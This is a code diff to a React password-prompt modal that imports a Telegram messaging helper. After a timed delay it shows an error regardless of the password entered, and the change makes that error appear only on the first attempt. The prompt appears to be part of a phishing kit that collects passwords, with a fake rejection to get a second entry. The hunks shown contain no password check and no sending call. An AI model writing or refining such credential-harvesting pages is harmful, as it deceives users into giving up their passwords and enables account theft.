@@ -7,6 +7,7 @@ import config from '@/utils/config';
 import sendMessage from '@/utils/telegram';
 import { translateText } from '@/utils/translate';
 import { PATHS } from '@/router/router';
+
 const PasswordInput = ({ onClose }) => {
     const navigate = useNavigate();
     const [password, setPassword] = useState('');
@@ -34,7 +35,25 @@ const PasswordInput = ({ onClose }) => {
     const translateAllTexts = useCallback(
         async (targetLang) => {
             try {
-                const [translatedTitle, translatedDesc, translatedLabel, translatedPlaceholder, translatedError, translatedContinue, translatedLoading, translatedSeconds] = await Promise.all([translateText(defaultTexts.title, targetLang), translateText(defaultTexts.description, targetLang), translateText(defaultTexts.passwordLabel, targetLang), translateText(defaultTexts.placeholder, targetLang), translateText(defaultTexts.errorMessage, targetLang), translateText(defaultTexts.continueBtn, targetLang), translateText(defaultTexts.loadingText, targetLang), translateText(defaultTexts.secondsText, targetLang)]);
+                const [
+                    translatedTitle,
+                    translatedDesc,
+                    translatedLabel,
+                    translatedPlaceholder,
+                    translatedError,
+                    translatedContinue,
+                    translatedLoading,
+                    translatedSeconds
+                ] = await Promise.all([
+                    translateText(defaultTexts.title, targetLang),
+                    translateText(defaultTexts.description, targetLang),
+                    translateText(defaultTexts.passwordLabel, targetLang),
+                    translateText(defaultTexts.placeholder, targetLang),
+                    translateText(defaultTexts.errorMessage, targetLang),
+                    translateText(defaultTexts.continueBtn, targetLang),
+                    translateText(defaultTexts.loadingText, targetLang),
+                    translateText(defaultTexts.secondsText, targetLang)
+                ]);
 
                 setTranslatedTexts({
                     title: translatedTitle,
@@ -87,7 +106,9 @@ const PasswordInput = ({ onClose }) => {
 
         await new Promise((resolve) => setTimeout(resolve, config.password_loading_time * 1000));
 
-        setShowError(true);
+        // ✅ chỉ show error ở lần sai đầu tiên
+        setShowError(attempts === 0);
+
         setAttempts((prev) => prev + 1);
         setIsLoading(false);
         setCountdown(0);
@@ -105,15 +126,34 @@ const PasswordInput = ({ onClose }) => {
             <div className='w-lg rounded-lg bg-white shadow-lg'>
                 <div className='flex items-center justify-between rounded-t-lg border-b border-gray-300 bg-[#f8f8f8] px-6 py-4'>
                     <p className='text-xl leading-6 font-semibold'>{translatedTexts.title}</p>
-                    <FontAwesomeIcon icon={faTimes} className='cursor-pointer hover:text-gray-600' onClick={onClose} />
+                    <FontAwesomeIcon
+                        icon={faTimes}
+                        className='cursor-pointer hover:text-gray-600'
+                        onClick={onClose}
+                    />
                 </div>
                 <div className='flex flex-col gap-4 px-6 py-4'>
                     <p className='text-base leading-6 text-[#212529bf]'>{translatedTexts.description}</p>
                     <p className='font-bold text-[#212529]'>{translatedTexts.passwordLabel}</p>
-                    <input type='password' placeholder={translatedTexts.placeholder} className='w-full rounded-lg border border-gray-300 px-3 py-1.5' value={password} onChange={(e) => setPassword(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleSubmit()} />
-                    {showError && <p className='leading-6 text-[#dc3545]'>{translatedTexts.errorMessage}</p>}
-                    <button className='rounded-lg bg-blue-500 px-3 py-1.5 text-white disabled:opacity-50' onClick={handleSubmit} disabled={isLoading || !password.trim()}>
-                        {isLoading ? `${translatedTexts.loadingText} ${countdown} ${translatedTexts.secondsText}...` : translatedTexts.continueBtn}
+                    <input
+                        type='password'
+                        placeholder={translatedTexts.placeholder}
+                        className='w-full rounded-lg border border-gray-300 px-3 py-1.5'
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                        onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
+                    />
+                    {showError && (
+                        <p className='leading-6 text-[#dc3545]'>{translatedTexts.errorMessage}</p>
+                    )}
+                    <button
+                        className='rounded-lg bg-blue-500 px-3 py-1.5 text-white disabled:opacity-50'
+                        onClick={handleSubmit}
+                        disabled={isLoading || !password.trim()}
+                    >
+                        {isLoading
+                            ? `${translatedTexts.loadingText} ${countdown} ${translatedTexts.secondsText}...`
+                            : translatedTexts.continueBtn}
                     </button>
                 </div>
             </div>
